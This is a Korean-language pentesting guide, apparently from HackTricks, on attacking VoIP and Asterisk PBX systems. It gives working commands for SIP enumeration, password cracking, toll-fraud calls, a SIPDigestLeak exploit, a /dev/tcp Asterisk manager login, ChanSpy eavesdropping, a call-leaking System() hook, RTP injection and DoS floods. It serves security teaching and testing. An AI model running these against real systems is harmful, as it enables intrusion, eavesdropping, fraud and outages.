# VoIP Pentesting

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

## VoIP 기본 정보

VoIP가 작동하는 방식에 대해 배우려면 다음을 확인하세요:

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}

## VoIP 열거

### 전화번호

레드 팀이 할 수 있는 첫 번째 단계 중 하나는 OSINT 도구, Google 검색 또는 웹 페이지 스크래핑을 사용하여 회사와 연락할 수 있는 사용 가능한 전화번호를 검색하는 것입니다.

전화번호를 얻은 후 온라인 서비스를 사용하여 운영자를 식별할 수 있습니다:

* [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
* [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
* [https://www.whitepages.com/](https://www.whitepages.com/)
* [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

운영자가 VoIP 서비스를 제공하는지 여부를 알면 회사가 VoIP를 사용하는지 확인할 수 있습니다... 게다가, 회사가 VoIP 서비스를 고용하지 않았지만 PSTN 카드를 사용하여 전통적인 전화망에 자체 VoIP PBX를 연결하는 경우도 있을 수 있습니다.

자동 응답 또는 음악과 같은 것들은 일반적으로 VoIP가 사용되고 있음을 나타냅니다.

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### OSINT 정보

VoIP 소프트웨어를 식별하는 데 도움이 되는 다른 OSINT 열거는 Red Team에게 유용합니다.

### 네트워크 열거

* **`nmap`**은 UDP 서비스를 스캔할 수 있지만, 스캔되는 UDP 서비스의 수가 많기 때문에 매우 느리고 이러한 종류의 서비스에 대해서는 정확하지 않을 수 있습니다.
* SIPVicious의 **`svmap`** (`sudo apt install sipvicious`)은 지정된 네트워크에서 SIP 서비스를 찾을 수 있습니다.
* `svmap`은 User-Agent `friendly-scanner`를 사용하기 때문에 **차단하기 쉽습니다**, 하지만 `/usr/share/sipvicious/sipvicious`의 코드를 수정하여 변경할 수 있습니다.
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`sipscan.py`**은 [**sippts**](https://github.com/Pepelux/sippts)**에서 제공하는 것입니다:** Sipscan은 UDP, TCP 또는 TLS를 통해 SIP 서비스를 매우 빠르게 스캔하는 도구입니다. 멀티스레드를 사용하여 대규모 네트워크 범위를 스캔할 수 있습니다. 포트 범위를 쉽게 지정할 수 있으며 TCP 및 UDP를 모두 스캔하고 다른 방법을 사용할 수 있습니다 (기본적으로 OPTIONS를 사용합니다). 또한 다른 User-Agent를 지정할 수도 있습니다 (그 외에도 더 많은 기능이 있습니다).
```bash
./sipscan.py -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200

```
* **metasploit**: 메타스플로잇
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### 추가 네트워크 열거

PBX는 다음과 같은 다른 네트워크 서비스를 노출시킬 수도 있습니다:

* **69/UDP (TFTP)**: 펌웨어 업데이트
* **80 (HTTP) / 443 (HTTPS)**: 웹에서 장치 관리
* **389 (LDAP)**: 사용자 정보를 저장하는 대체 수단
* **3306 (MySQL**): MySQL 데이터베이스
* **5038 (Manager)**: 다른 플랫폼에서 Asterisk 사용 가능
* **5222 (XMPP)**: Jabber를 사용한 메시지
* **5432 (PostgreSQL)**: PostgreSQL 데이터베이스
* 그 외...

### 메서드 열거

`sippts`에서 `sipenumerate.py`를 사용하여 PBX에서 사용 가능한 **메서드를 찾을 수 있습니다**. [**sippts**](https://github.com/Pepelux/sippts)
```bash
python3 sipenumerate.py -i 10.10.0.10 -r 5080
```
### Extension Enumeration

PBX(사설 분기 교환) 시스템에서의 확장은 조직이나 기업 내에서 개별 전화 라인, 장치 또는 사용자에게 할당된 고유한 내부 식별자를 의미합니다. 확장을 통해 각 사용자나 장치에 대해 개별 외부 전화 번호 없이도 조직 내에서 효율적으로 전화를 라우팅할 수 있습니다.

* SIPVicious의 **`svwar`** (`sudo apt install sipvicious`)로부터: `svwar`는 무료 SIP PBX 확장 라인 스캐너입니다. 개념적으로는 전통적인 워다이얼러와 유사하게 **확장 범위나 주어진 확장 목록을 추측함으로써 작동**합니다.
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`sipextend.py`**은 [**sippts**](https://github.com/Pepelux/sippts)**에서 제공하는 도구입니다:** Sipextend는 SIP 서버에서 확장 기능을 식별합니다. Sipextend는 대규모 네트워크 및 포트 범위를 확인할 수 있습니다.
```bash
python3 sipexten.py -i 10.10.0.10 -r 5080 -e 100-200
```
* **metasploit**: metasploit을 사용하여 확장자/사용자 이름을 열거할 수도 있습니다:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX**는 Inter Asterisk Exchange 프로토콜 **사용자명 무차별 대입 열거기**입니다. enumIAX는 두 가지 다른 모드에서 작동할 수 있습니다. 순차적인 사용자명 추측 또는 사전 공격.
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## VoIP 공격

### 비밀번호 무차별 대입

**PBX**와 일부 **확장자/사용자 이름**을 발견한 후, 레드 팀은 일반적인 비밀번호 사전을 사용하여 인증을 무차별 대입하기 위해 확장자를 통해 `REGISTER` 메서드로 인증을 시도할 수 있습니다.

{% hint style="danger" %}
**사용자 이름**이 확장자와 동일할 수 있지만, 이는 PBX 시스템, 구성 및 조직의 기호에 따라 다를 수 있습니다...

사용자 이름이 확장자와 동일하지 않은 경우, 무차별 대입을 위해 **사용자 이름을 알아내야 합니다**.
{% endhint %}

* SIPVicious의 **`svcrack`** (`sudo apt install sipvicious`): SVCrack은 PBX에서 특정 사용자 이름/확장자의 비밀번호를 무차별 대입하여 크랙할 수 있습니다.
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`sipcrack.py`**은 [**sippts**](https://github.com/Pepelux/sippts)**에서 제공하는 도구입니다:** SIP Digest Crack은 SIP 프로토콜 내에서 Digest 인증을 크랙하는 도구입니다.

{% code overflow="wrap" %}
```bash
python3 siprcrack.py -i 10.10.0.10 -r 5080 -e 100,101,103-105 -w wordlist/rockyou.txt
```
{% endcode %}

* **Metasploit**:
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb)

### VoIP 스니핑

**Open Wifi 네트워크** 내에서 VoIP 장비를 찾으면 모든 정보를 **스니핑**할 수 있습니다. 더욱이, Ethernet으로 연결되거나 보호된 Wifi에 연결된 **보다 폐쇄적인 네트워크** 내에 있다면 **ARP스푸핑**과 같은 **MitM 공격**을 수행하여 **PBX와 게이트웨이** 사이에서 정보를 스니핑할 수 있습니다.

네트워크 정보 중에서는 장비를 관리하기 위한 **웹 자격 증명**, 사용자 **확장**, **사용자 이름**, **IP** 주소, 심지어 **해시된 비밀번호**와 **RTP 패킷**을 찾을 수 있으며, 이를 재생하여 **대화를 들을 수**도 있습니다.

이러한 정보를 얻기 위해 Wireshark, tcpdump와 같은 도구를 사용할 수 있지만, VoIP 대화를 스니핑하기 위해 **특별히 만들어진 도구인** [**ucsniff**](https://github.com/Seabreg/ucsniff)를 사용할 수도 있습니다.

{% hint style="danger" %}
**SIP 통신에서 TLS를 사용하는 경우** SIP 통신을 알아볼 수 없습니다.\
**SRTP**와 **ZRTP**를 사용하는 경우에도 **RTP 패킷은 평문으로 표시되지 않습니다**.
{% endhint %}

#### SIP 자격 증명

**SIP REGISTER 통신**의 예제를 확인하여 **자격 증명이 어떻게 전송되는지** 이해하세요.

* **`sipdump`** 및 **`sipcrack`**, **sipcrack**의 일부 (`apt-get install sipcrack`): 이 도구들은 SIP 프로토콜 내에서 **다이제스트 인증**을 **pcap에서 추출**하고 **브루트포스**할 수 있습니다.
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`siptshar.py`, `sipdump.py`, `sipcrack.py`** from [**sippts**](https://github.com/Pepelux/sippts)**:**
* **SipTshark**는 PCAP 파일에서 SIP 프로토콜의 데이터를 추출합니다.
* **SipDump**는 PCAP 파일에서 SIP Digest 인증을 추출합니다.
* **SIP Digest Crack**은 SIP 프로토콜 내에서 Digest 인증을 크랙하는 도구입니다.
```bash
python3 siptshark.py -f captura3.pcap [-filter auth]
python3 sipdump.py -f captura3.pcap -o data.txt
python3 sipcrack.py -f data.txt -w wordlist/rockyou.txt
```
#### DTMF 코드

네트워크 트래픽에서는 SIP 자격 증명뿐만 아니라 **DTMF 코드**도 찾을 수 있습니다. 이 코드는 예를 들어 **음성 사서함**에 액세스하는 데 사용됩니다.\
이러한 코드를 **INFO SIP 메시지**, **오디오** 또는 **RTP 패킷** 내에 보낼 수 있습니다. RTP 패킷 내에 코드가 포함되어 있는 경우 대화의 해당 부분을 잘라내고 도구 multimo를 사용하여 추출할 수 있습니다:
```bash
multimon -a DTMF -t wac pin.wav
```
### 무료 통화 / Asterisks 연결 구성 오류

Asterisk에서는 특정 IP 주소로부터의 연결 또는 **모든 IP 주소로부터의 연결**을 허용할 수 있습니다:
```
host=10.10.10.10
host=dynamic
```
만약 IP 주소가 지정된다면, 호스트는 일정 시간마다 REGISTER 요청을 보내지 않아도 됩니다 (REGISTER 패킷에는 일반적으로 30분 동안 유효한 TTL이 포함되어 있으므로 다른 시나리오에서는 전화기가 30분마다 REGISTER해야 합니다). 그러나 VoIP 서버에서 전화를 받을 수 있도록 연결을 허용하는 열린 포트가 필요합니다.

사용자를 정의하기 위해 다음과 같이 정의할 수 있습니다:

* **`type=user`**: 사용자는 사용자로서 전화를 받을 수 있습니다.
* **`type=friend`**: 피어로 전화를 걸고 사용자로서 전화를 받을 수 있습니다 (확장과 함께 사용됨)
* **`type=peer`**: 피어로 전화를 보내고 받을 수 있습니다 (SIP 트렁크)

또한 다음과 같이 보안 변수를 사용하여 신뢰를 설정할 수 있습니다:

* **`insecure=port`**: IP에 의해 확인된 피어 연결을 허용합니다.
* **`insecure=invite`**: INVITE 메시지에 대한 인증이 필요하지 않습니다.
* **`insecure=port,invite`**: 둘 다

{% hint style="warning" %}
**`type=friend`**를 사용할 때는 **host** 변수의 **값이 사용되지 않습니다**. 따라서 관리자가 그 값을 사용하여 SIP 트렁크를 잘못 구성하면 **누구나 연결할 수 있게 됩니다**.

예를 들어, 다음과 같은 구성은 취약합니다:\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### 무료 통화 / Asterisks 컨텍스트 잘못 구성

Asterisk에서 **컨텍스트**는 다이얼 플랜에서 **관련된 확장, 동작 및 규칙을 그룹화하는** 이름이 지정된 컨테이너 또는 섹션입니다. 다이얼 플랜은 Asterisk 시스템의 핵심 구성 요소로서, **들어오는 및 나가는 전화가 처리되고 경로 지정되는 방식을 정의**합니다. 컨텍스트는 다이얼 플랜을 구성하고, 액세스 제어를 관리하며, 시스템의 서로 다른 부분 간에 분리를 제공하기 위해 사용됩니다.

각 컨텍스트는 일반적으로 **`extensions.conf`** 파일에 정의됩니다. 컨텍스트는 대괄호로 표시되며, 컨텍스트 이름이 그 안에 포함됩니다. 예를 들어:
```bash
csharpCopy code[my_context]
```
안내서에서는 컨텍스트 내에서 확장자(다이얼 번호의 패턴)를 정의하고 해당 확장자를 일련의 동작 또는 응용 프로그램과 연결합니다. 이러한 동작은 통화 처리 방식을 결정합니다. 예를 들어:
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
이 예제는 "my\_context"라는 간단한 컨텍스트와 "100"이라는 확장자를 가지고 있습니다. 누군가가 100을 누르면 전화가 받아지고, 환영 메시지가 재생되며, 그 후 전화가 종료됩니다.

이것은 **다른 번호로 전화를 걸 수 있는** **다른 컨텍스트**입니다:
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
만약 관리자가 **기본 컨텍스트**를 다음과 같이 정의한다면:
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
누구나 **서버를 사용하여 다른 번호로 전화를 걸 수 있습니다** (서버 관리자가 전화 요금을 지불합니다).
{% endhint %}

{% hint style="danger" %}
또한, 기본적으로 **`sip.conf`** 파일에는 **`allowguest=true`**가 포함되어 있으므로 **인증 없이** 어떤 공격자든 다른 번호로 전화를 걸 수 있습니다.
{% endhint %}

*   [**sippts**](https://github.com/Pepelux/sippts)의 **`sipinvite.py`**:** Sipinvite는 **인증 없이 PBX 서버에서 전화를 걸 수 있는지** 확인합니다. SIP 서버가 잘못된 구성을 가지고 있다면 외부 번호로 전화를 걸 수 있게 됩니다. 또한, 전화를 두 번째 외부 번호로 전달할 수도 있습니다.

예를 들어, Asterisk 서버의 컨텍스트 구성이 잘못되었다면, 인증 없이 INVITE 요청을 수락할 수 있습니다. 이 경우, 공격자는 어떤 사용자/비밀번호도 알지 못해도 전화를 걸 수 있습니다.

{% code overflow="wrap" %}
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
python3 sipinvite.py -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
python3 sipinvite.py -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### 무료 통화 / 잘못 구성된 IVRS

IVRS는 **Interactive Voice Response System**의 약자로, 음성 또는 터치톤 입력을 통해 사용자가 컴퓨터화된 시스템과 상호작용할 수 있는 전화기 기술입니다. IVRS는 정보 제공, 전화 라우팅, 사용자 입력 수집 등 다양한 기능을 제공하는 **자동화된 통화 처리** 시스템을 구축하는 데 사용됩니다.

VoIP 시스템에서의 IVRS는 일반적으로 다음과 같은 구성 요소로 이루어져 있습니다:

1. **음성 안내**: IVR 메뉴 옵션과 지시사항을 사용자에게 안내하는 미리 녹음된 오디오 메시지입니다.
2. **DTMF** (Dual-Tone Multi-Frequency) 신호: 전화기의 키를 눌러 생성되는 터치톤 입력으로, IVR 메뉴를 탐색하고 입력을 제공하는 데 사용됩니다.
3. **전화 라우팅**: 사용자 입력에 따라 특정 부서, 에이전트 또는 내선과 같은 적절한 대상으로 전화를 연결하는 것입니다.
4. **사용자 입력 수집**: 계정 번호, 사례 ID 또는 기타 관련 데이터와 같은 호출자로부터의 정보 수집입니다.
5. **외부 시스템과의 통합**: IVR 시스템을 데이터베이스나 다른 소프트웨어 시스템에 연결하여 정보에 액세스하거나 업데이트하고, 작업을 수행하거나 이벤트를 트리거하는 것입니다.

Asterisk VoIP 시스템에서는 다이얼 플랜 (**`extensions.conf`** 파일) 및 `Background()`, `Playback()`, `Read()` 등의 다양한 응용 프로그램을 사용하여 IVR을 생성할 수 있습니다. 이러한 응용 프로그램을 사용하여 음성 안내를 재생하고 사용자 입력을 수집하며 통화 흐름을 제어할 수 있습니다.

#### 취약한 구성의 예제
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
이전은 사용자가 **1을 눌러** 부서에 전화를 걸거나, **2를 눌러** 다른 부서에 전화를 걸거나, **전체 내선 번호**를 알고 있다면 입력하라는 예시입니다.\
이 취약점은 지정된 **내선 번호 길이가 확인되지 않아 사용자가 5초의 대기 시간 동안 전체 번호를 입력하면 호출될 수 있다는 사실입니다.**

### 내선 번호 삽입

다음과 같은 내선 번호를 사용하여 삽입할 수 있습니다:
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
**`${EXTEN}`**은 호출될 **내선(extension)**을 나타냅니다. **ext 101이 입력**되면 다음과 같은 일이 발생합니다:
```scss
exten => 101,1,Dial(SIP/101)
```
그러나, **`${EXTEN}`**이 (이전 Asterisk 버전과 같이) **숫자 이외의 문자**를 입력할 수 있게 허용한다면, 공격자는 **`101&SIP123123123`**을 입력하여 전화번호 123123123로 전화를 걸 수 있습니다. 그리고 이것이 결과가 될 것입니다:
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
따라서, **`101`** 확장자와 **`123123123`**에 대한 통화가 전송되고 통화를 받는 첫 번째 통화만 설정됩니다... 그러나 공격자가 일치하는 것이 없지만 수행되고 있는 **어떤 일치도 우회하는 확장자**를 사용하면, 그는 **원하는 번호로만 통화를 주입**할 수 있습니다.

## SIPDigestLeak

SIP Digest Leak은 하드웨어 및 소프트웨어 IP 전화기 및 전화 어댑터 (VoIP에서 아날로그로)를 포함한 많은 수의 SIP 전화기에 영향을 미치는 취약점입니다. 이 취약점은 비밀번호에서 계산된 Digest 인증 응답이 **유출되는 것을 허용**합니다. 그런 다음 오프라인 비밀번호 공격이 가능하며 도전 응답을 기반으로 대부분의 비밀번호를 복구할 수 있습니다.

**[여기에서 취약점 시나리오 참조**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. IP 전화기 (피해자)가 5060번 포트에서 수신 대기하고 전화를 받습니다.
2. 공격자가 IP 전화기에 INVITE를 보냅니다.
3. 피해자 전화기가 울리기 시작하고 누군가 전화를 받아서 바로 끊습니다 (다른 쪽에서 전화에 응답하는 사람이 없기 때문에).
4. 전화가 끊어지면 **피해자 전화기가 공격자에게 BYE를 보냅니다**.
5. **공격자는 인증을 요청하는 407 응답**을 발행하고 인증 도전을 발행합니다.
6. **피해자 전화기는 두 번째 BYE에서 인증 도전에 대한 응답**을 제공합니다.
7. **공격자는 로컬 머신 (또는 분산 네트워크 등)에서 도전 응답에 대한 무차별 대입 공격**을 수행하고 비밀번호를 추측할 수 있습니다.

* [**sippts**](https://github.com/Pepelux/sippts)의 **sipdigestleak.py**는 이 취약점을 이용합니다.
```bash
python3 sipdigestleak.py -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### 클릭투콜

클릭투콜은 **웹 사용자**(예를 들어 제품에 관심이 있는 사용자)가 **전화번호를 입력**하여 전화를 받을 수 있는 기능입니다. 그런 다음 상업용 전화가 걸리고, 사용자가 **전화를 받으면 에이전트와 연결**됩니다.

이를 위한 일반적인 Asterisk 프로필은 다음과 같습니다:
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* 이전 프로필은 **알려진 비밀번호로 어떤 IP 주소든 연결을 허용**합니다.
* 이전에 언급한 것처럼 **통화를 조직**하기 위해서는 **읽기 권한이 필요하지 않으며**, **쓰기**에서 **originate**만 필요합니다.

이러한 권한으로 인해 비밀번호를 알고 있는 어떤 IP도 연결하고 너무 많은 정보를 추출할 수 있습니다:

{% code overflow="wrap" %}
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**추가 정보나 조치를 요청할 수 있습니다.**

### **도청**

Asterisk에서는 **`ChanSpy`** 명령을 사용하여 **감시할 확장자(들)** (또는 모든 확장자)를 지정하여 진행 중인 대화를 들을 수 있습니다. 이 명령은 확장자에 할당되어야 합니다.

예를 들어, **`exten => 333,1,ChanSpy('all',qb)`**는 **확장자 333**을 **호출**하면 **`all`** 확장자를 **모니터링**하고, 새로운 대화가 시작될 때마다 (**`b`**) 조용한 모드 (**`q`**)로 **들을 수 있도록** 설정합니다. 대화에서 다른 대화로 이동하려면 **`*`**을 누르거나 확장자 번호를 선택할 수 있습니다.

대화를 듣는 대신, 확장자를 사용하여 대화를 **파일로 기록**할 수도 있습니다.

{% code overflow="wrap" %}
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

통화는 **`/tmp`**에 저장됩니다.

또한 Asterisk가 종료될 때 통화를 유출시킬 수 있는 스크립트를 실행할 수도 있습니다.
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### RTCPBleed

**RTCPBleed**은 Asterisk 기반의 VoIP 서버에 영향을 미치는 주요 보안 문제입니다(2017년에 발표되었습니다). 이 취약점은 **VoIP 대화를 전달하는 RTP(실시간 프로토콜) 트래픽**이 **인터넷 상의 누구에게나 가로채고 재지정될 수 있도록** 허용합니다. 이는 RTP 트래픽이 NAT(네트워크 주소 변환) 방화벽을 통과할 때 인증을 우회하기 때문에 발생합니다.

RTP 프록시는 두 개 이상의 당사자 간의 RTP 스트림을 프록시하는 데 영향을 미치는 RTC 시스템의 NAT 제한을 해결하기 위해 사용됩니다. NAT가 적용되면 RTP 프록시 소프트웨어는 종종 시그널링(예: SIP)을 통해 검색된 RTP IP 및 포트 정보에 의존할 수 없습니다. 따라서 일부 RTP 프록시는 이러한 IP 및 포트 튜플이 자동으로 학습되는 메커니즘을 구현했습니다. 이는 들어오는 RTP 트래픽을 검사하고 들어오는 RTP 트래픽의 소스 IP와 포트를 응답해야 할 IP와 포트로 표시하는 것으로 자동으로 학습됩니다. 이 메커니즘은 "학습 모드"라고 불릴 수 있으며 **인증을 사용하지 않습니다**. 따라서 **공격자**는 **RTP 프록시로 RTP 트래픽을 보낼 수 있으며** RTP 스트림의 호출자 또는 피호출자에게 전달되어야 하는 프록시된 RTP 트래픽을 수신할 수 있습니다. 이 취약점을 RTP Bleed라고 부르며, 이는 공격자가 합법적인 사용자에게 전송되어야 하는 RTP 미디어 스트림을 수신할 수 있게 합니다.

RTP 프록시와 RTP 스택의 또 다른 흥미로운 동작은 때로는 **RTP Bleed에 취약하지 않더라도** 어떤 소스에서든 RTP 패킷을 **수락, 전달 및/또는 처리**할 수 있다는 것입니다. 따라서 공격자는 합법적인 RTP 스트림 대신 불법적인 미디어를 주입할 수 있는 RTP 패킷을 보낼 수 있습니다. 이 공격을 RTP 주입이라고 부르며, 이는 RTP 프록시와 엔드포인트 모두에서 발견될 수 있는 취약점입니다.

Asterisk와 FreePBX는 기존에 **`NAT=yes` 설정**을 사용하여 RTP 트래픽이 인증을 우회하도록 허용하여 통화 중에 오디오가 없거나 일방적인 오디오가 발생할 수 있습니다.

자세한 정보는 [https://www.rtpbleed.com/](https://www.rtpbleed.com/)을 참조하십시오.

* [**sippts**](https://github.com/Pepelux/sippts)의 **`rtpbleed.py`**는 RTP Bleed 취약점을 감지하기 위해 RTP 스트림을 보냅니다.
```bash
python3 rtpbleed.py -i 10.10.0.10
```
* **`rtcpbleed.py`**은 [**sippts**](https://github.com/Pepelux/sippts)에서 제공하는 도구입니다. RTP 스트림을 전송하여 RTP Bleed 취약점을 감지합니다.
```bash
python3 rtcpbleed.py -i 10.10.0.10
```
* **`rtpbleedflood.py`**은 [**sippts**](https://github.com/Pepelux/sippts)에서 가져온 것입니다. RTP 블리드 취약점을 이용하여 RTP 스트림을 전송합니다.
```bash
python3 rtpbleedflood.py -i 10.10.0.10 -p 10070 -v
```
* **`rtpbleedinject.py`**은 [**sippts**](https://github.com/Pepelux/sippts)에서 가져온 것입니다. RTP Bleed 취약점을 이용하여 RTP 스트림(오디오 파일에서)을 전송하는 익스플로잇입니다.
```bash
python3 rtpbleedinject.py -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

Asterisk에서 취약한 웹 매니저 서버를 침해하여 **확장 규칙을 추가하고 다시 로드**할 수 있다면, **`System`** 명령을 사용하여 RCE를 얻을 수 있습니다.
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
**`Shell`**이라는 명령어는 필요한 경우 시스템 명령을 실행하는 데 사용될 수 있습니다.

{% hint style="warning" %}
서버가 **`System`** 명령어에서 특정 문자 사용을 금지하는 경우 (예: Elastix), 웹 서버가 시스템 내에서 파일을 **어떤 방식으로든 생성할 수 있는지** 확인하고, 이를 사용하여 **백도어 스크립트를 생성**한 다음 **`System`**을 사용하여 해당 **스크립트를 실행**할 수 있습니다.
{% endhint %}

#### 흥미로운 로컬 파일 및 권한

* **`sip.conf`** -> SIP 사용자의 비밀번호를 포함합니다.
* **Asterisk 서버가 root로 실행**되는 경우, root를 침해할 수 있습니다.
* **mysql root 사용자**는 비밀번호가 없을 수도 있습니다.
* 이를 사용하여 백도어로 새로운 mysql 사용자를 생성할 수 있습니다.
* **`FreePBX`**
* **`amportal.conf`** -> 웹 패널 관리자 (FreePBX)의 비밀번호를 포함합니다.
* **`FreePBX.conf`** -> 데이터베이스에 액세스하는 데 사용되는 FreePBXuser 사용자의 비밀번호를 포함합니다.
* 이를 사용하여 백도어로 새로운 mysql 사용자를 생성할 수 있습니다.
* **`Elastix`**
* **`Elastix.conf`** -> mysql root 패스워드, IMAPd 패스워드, 웹 관리자 패스워드와 같은 여러 암호를 평문으로 포함합니다.
* **여러 폴더**는 침해된 asterisk 사용자에게 속할 것입니다 (root로 실행되지 않는 경우). 이 사용자는 이전 파일을 읽을 수 있으며 구성도 제어할 수 있으므로 Asterisk가 실행될 때 다른 백도어 바이너리를 로드하도록 할 수 있습니다.

### RTP 주입

**`rtpinsertsound`** (`sudo apt install rtpinsertsound`) 및 **`rtpmixsound`** (`sudo apt install rtpmixsound`)와 같은 도구를 사용하여 대화에 **`.wav`** 파일을 삽입할 수 있습니다.

또는 [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/)의 스크립트를 사용하여 대화를 **스캔**하는 (**`rtpscan.pl`**), 대화에 `.wav`를 보내는 (**`rtpsend.pl`**) 및 대화에 **노이즈를 삽입**하는 (**`rtpflood.pl`**) 등의 작업을 수행할 수 있습니다.

### DoS

VoIP 서버에서 DoS를 시도하는 여러 가지 방법이 있습니다.

* [**sippts**](https://github.com/Pepelux/sippts)의 **`sipflood.py`**: **_**SipFlood**_는 대상에게 무제한 메시지를 보냅니다.
* `python3 sipflood.py -i 10.10.0.10 -r 5080 -m invite -v`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): Asterisk에서 사용되는 IAX 프로토콜에 대한 DoS 공격
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): SIP/SDP INVITE 메시지를 UDP/IP로 플러딩하는 도구
* [**rtpflood**](https://www.kali.org/tools/rtpflood/): 여러 개의 올바르게 구성된 RTP 패킷을 보냅니다. 사용 중인 RTP 포트를 알아야 합니다 (먼저 스니핑).
